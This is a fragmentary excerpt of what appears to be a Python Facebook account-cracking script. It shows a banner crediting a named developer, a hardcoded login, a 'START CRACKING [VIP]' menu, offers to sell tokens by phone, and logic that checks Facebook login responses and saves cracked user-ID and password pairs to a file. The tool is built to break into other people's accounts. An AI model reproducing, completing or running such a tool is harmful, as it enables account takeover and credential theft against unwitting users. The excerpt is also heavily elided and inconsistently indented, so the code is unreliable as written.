...
\033[1;91m-----------------------------------------------------
 \033[1;91m(*)\033[1;95m Developer: ◠◡♥♥  MAHDI HASAN(SHUVO)  ♥♥◡◠
 \033[1;92m(*)\033[1;94m Facebook : ◠◡♥♥ Mahdi.80808 ♥♥◡◠
 \033[1;93m(*)\033[1;93m Github   : ◠◡♥♥ Shuvo-BBHH   ♥♥◡◠
 \033[1;97m(*)\033[1;96m Helper   : ◠◡♥♥  ♥♥◠◡
 \033[1;94m(*)\033[1;92m
...
def main_apv():
    ...
    try:
        ...
        os.system("xdg-open https://wa.me/+8801766554098")
...
def tool():
	...
	print(logo)
	time.sleep(0.5)
	print("First Put Tool Username  MAHDI").center(50)
	print("")
	time.sleep(0.5)
...
def step_main():
	...
	print("")
	time.sleep(0.5)
	print("First Put Tool Password SHUVO").center(50)
	print("")
	time.sleep(0.5)
...
def main():
	...
	print("\x1b[1;93m[1]\x1b[1;92m  START CRACKING \x1b[1;93m[VIP]\n")
        print("\x1b[1;93m[2]\x1b[1;92m MY WHATSAPP NO \x1b[1;98m01887408882\n")
	print("")
	os.system('xdg-open https://www.facebook.com/mahdi.80808')
	log_sel()
def log_sel():
...
def login():
	try:
		...
		print("\x1b[1;92m[2]\x1b[1;93m Back ")
                print("\x1b[1;92m[3]\x1b[1;93m FOR TOKEN CONTACT 01887408882")
		print(47*"\x1b[1;92m-")
		print("")
		log_select()
def log_select():
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [MAHDI-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("IMTIAZcp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
